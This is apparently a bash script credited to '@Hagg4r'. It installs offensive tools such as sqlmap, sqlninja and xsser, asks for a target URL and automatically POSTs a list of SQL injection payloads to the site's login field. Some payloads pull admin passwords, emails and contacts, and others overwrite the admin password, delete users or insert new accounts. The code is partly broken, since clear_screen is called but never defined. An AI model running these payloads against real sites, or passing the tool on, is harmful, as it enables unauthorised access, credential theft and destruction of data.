#!/bin/bash

# Author information
echo "by @Hagg4r"

# Define functions
run_command() {
    "$@" 2>&1
}

run_sudo_command() {
    sudo "$@" 2>&1
}

save_to_file() {
    local filepath="$1"
    local data="$2"
    echo "$data" >> "$filepath"
}

install_tools() {
    declare -A tools=(
        ["curl"]="curl"
        ["sqlmap"]="sqlmap"
        ["nmap"]="nmap"
        ["uniscan"]="uniscan"
        ["whois"]="whois"
        ["subfinder"]="subfinder"
        ["xsser"]="xsser"
        ["hping3"]="hping3"
        ["sqlninja"]="sqlninja"
        ["imagemagick"]="imagemagick"
        ["openvpn"]="openvpn"
    )

    for tool in "${!tools[@]}"; do
        echo "Checking if $tool is installed..."
        if ! command -v "$tool" &> /dev/null; then
            echo "$tool not found. Installing $tool..."
            run_sudo_command apt-get install -y "${tools[$tool]}"
        else
            echo "$tool is already installed."
        fi
    done
}

print_header() {
    local colors=('\033[91m' '\033[93m' '\033[92m' '\033[94m' '\033[95m' '\033[96m')
    local header="
       .   .   ____                   _   .___________.  __   .______      
|  | |  \\ |  |  /      ||  |  |  | |  |        /   \\  |           | /  __  \\  |   _  \\     
|  | |   \\|  | |  ,----'|  |  |  | |  |       /  ^  \\ `---|  |----`|  |  |  | |  |_)  |    
|  | |  . \`  | |  |     |  |  |  | |  |      /  /_\\  \\    |  |     |  |  |  | |      /     
|  | |  |\\   | |  \`----.|  \`--'  | |  \`----./  _  \\   |  |     |  \`--'  | |  |\\  \\----.
|__| |__| \\__|  \\______| \\______/  |_______/__/     \\__\\  |__|      \\______/  | _| \`._____|
    "
    for color in "${colors[@]}"; do
        echo -e "$color$header"
        sleep 0.5
        clear_screen
    done
    echo -e "\033[0m"  # Reset color to default
}

check_website_status() {
    local url="$1"
    if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q "200"; then
        echo "The website $url is accessible."
        return 0
    else
        echo "The website $url is not accessible."
        return 1
    fi
}

perform_sql_injection() {
    local target_url="$1"
    local results_dir="$2"
    local payloads=(
        "' OR 1=1 --"
        "' OR '1'='1' --"
        "' OR '1'='1'/*"
        "' OR '1'='1'#"
        "' OR 1=1 UNION SELECT 1,2,3 --"
        "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
        "' OR 1=1 UNION SELECT username, password FROM users WHERE username='admin';"
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
        "' OR 1=1 UNION SELECT email FROM users --"
        "' OR 1=1 UNION SELECT password FROM users WHERE username='admin';"
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
        "SELECT * FROM users WHERE username='admin';"
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
        "UPDATE users SET password='newpassword' WHERE username='admin';"
        "DELETE FROM users WHERE username='olduser';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;"
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';"
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';"
        "SELECT * FROM products WHERE name LIKE '%user_input%';"
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
        "-- -"
        "-- /*"
        "-- #"
        "/*!*/"
        "OR 1=1"
        "OR 'a'='a'"
        "OR 'a'='a' --"
        "OR 'a'='a' /*"
        "OR 'a'='a' #"
        "OR 'a'='a' /*!' OR 'a'='a'"
    )

    local file_count=1
    for payload in "${payloads[@]}"; do
        local data="username=admin${payload}&password=password"
        local response
        response=$(curl -s -d "$data" -X POST "$target_url")
        local output_file="$results_dir/${payload%.---}.txt"
        save_to_file "$output_file" "$response"
        echo "Saved SQL Injection results to $output_file"
        ((file_count++))
    done
}

main() {
    # Install necessary tools
    install_tools
    
    # Print the animated header
    print_header
    
    # Clear the screen
    clear_screen
    
    # Get the target URL from the user
    read -p "Enter the target URL: " target_url
    
    # Create a results directory
    local results_dir="./results"
    mkdir -p "$results_dir"
    
    # Check if the website is accessible
    if check_website_status "$target_url"; then
        echo "Starting SQL Injection attempts..."
        perform_sql_injection "$target_url" "$results_dir"
        
        echo "SQL injection complete. Results saved in $results_dir."
    else
        echo "The website is not accessible. Exiting..."
    fi
}

# Run the main function
main
